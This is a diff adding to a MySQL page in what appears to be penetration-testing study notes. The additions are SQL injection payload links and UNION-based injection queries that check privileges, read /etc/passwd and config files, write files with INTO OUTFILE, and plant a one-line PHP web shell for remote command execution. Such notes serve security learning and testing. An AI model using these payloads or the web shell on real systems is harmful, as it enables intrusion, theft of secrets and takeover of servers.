@@ -8,8 +8,33 @@ tags:
   - relational database
   - SQL
 ---
-
 # MySQL
+
+!!! tip "Related resources"
+	- [Detailed SQLi Cheat sheet for manual attack](sqli-manual-attack.md).
+	- [SQL injection](webexplotation/sql-injection.md)
+	- [NoSQL injection](webexplotation/nosql-injection.md)
+	- [SQL injections](webexplotation/sqlite-injections.md)
+
+
+??? example "Languages and dictionaries"
+	| Server | Dictionary |
+	| -- | -- |
+	|  [MySQL](../mysql.md) | [MySQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MySQL%20Injection.md). | 
+	| [MSSQL](../mssql.md) | [MSSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MSSQL%20Injection.md). |
+	|  [PostgreSQL](../5432-postgresql.md) | [PostgreSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/PostgreSQL%20injection.md). |
+	|  [Oracle](../1521-oracle-transparent-network-substrate.md) | [Oracle SQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Oracle-SQL-injections.md). |
+	| [SQLite](sqlite-injections.md) | [SQLite payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/SQLite-injection.md). | 
+	| Cassandra | [Cassandra payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Cassandra%20Injection.md). | 
+
+??? example "Attack-based dictionaries"
+    - [Generic SQL Injection Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/generic-injections)
+    - [Generic Error Based Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based).
+    - [Generic Union Select Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/union-select).
+    - [SQL time based payloads ](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/time-based).
+    - [SQL Injection Auth Bypass Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/auth-bypass) 
+
+
 
 **MySQL**: MySQL is an open-source relational database management system(RDBMS) based on Structured Query Language (SQL). It is developed and managed by oracle corporation and initially released on 23 may, 1995. It is widely being used in many small and large scale industrial applications and capable of handling a large volume of data. After the acquisition of MySQL by Oracle, some issues happened with the usage of the database and hence MariaDB was developed.
 
@@ -260,13 +285,102 @@ SELECT name, description FROM products WHERE id=9 UNION SELECT price FROM produc
 current_user()
 user()
 
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+
 # Show current database
 database()
+
+# we can test if we have super admin privileges with the following query:
+SELECT super_priv FROM mysql.user
+# This in a UNION query would be (example):
+# cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+# Another example:
+# cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+
+# Dump privileges:
+SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+# As an example in an UNION query payload:
+# cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+
+
+```
+
+
+###  `FILE` privilege enabled: Upload a shell
+
+If our user has the `FILE` privilege enabled, they can read and potentially write files:
+
+The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files.
+
+```sql
+SELECT LOAD_FILE('/etc/passwd');
+# Example of the payload in an UNION attack:
+# cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+# Another example:
+# cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
+
+```
+
+
+**Write Files. To be able to write files to the back-end server using a MySQL database, we require three things:**
+
+**1.** User with `FILE` privilege enabled. If our user is root:
+
+```sql
+SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+
+**2.**  MySQL global `secure_file_priv` variable not enabled
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+# Final SQL query
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+
+# In an example of an UNION query attack:
+# cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+
+```
+
+The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings.
+
+**3.**  Write access to the location we want to write to on the back-end server. The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.
+
+```sql
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+
+# This will create a test.txt file owned by the mysql user
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+
+# Example in an UNION injection attack:
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+```
+
+**Tip**: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
+
+**4.** Uploading a shell. This is a PHP shell:
+
+```php
+<?php system($_REQUEST[0]); ?>
+```
+
+Let's replicate the UNION injection attack:
+
+```sql
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
+
+This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:
+
+```html
+https://$ip:$port/shell.php?0=id
 ```
 
 
 ## Well-know vulnerabilities
-
 
 ### Misconfigurations
 
